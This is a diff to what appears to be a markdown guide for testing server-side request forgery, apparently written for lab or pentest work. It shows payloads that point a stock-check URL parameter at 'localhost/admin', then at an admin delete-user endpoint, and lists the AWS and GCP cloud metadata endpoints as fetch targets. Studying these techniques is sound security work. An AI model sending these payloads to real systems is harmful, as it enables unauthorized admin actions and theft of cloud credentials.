@@ -15,8 +15,8 @@ Hunt for the fetch primitive — any input where the backend retrieves a URL / h
 - The param often does NOT look like a bare URL. It may be a full `http://host:port/path?...` the server calls **verbatim** (so replace the WHOLE value), or just a `host` / `host:port` the server concatenates a fixed path onto.
 
 **The pivot (the actual exploit):** swap the fetch target for the internal resource, then chain the action.
-- `stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1` → `stockApi=http://localhost/admin`
-- then: `stockApi=http://localhost/admin/delete?username=carlos`
+- `stockApi=http://internal-api.example:8080/product/stock/check?productId=1` → `stockApi=http://localhost/admin`
+- then chain the privileged action the internal endpoint exposes: `stockApi=http://localhost/admin/delete?username=<target-user>`
 - cloud: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP).
 
 ## 1. Identify the Fetch Primitive Before Testing
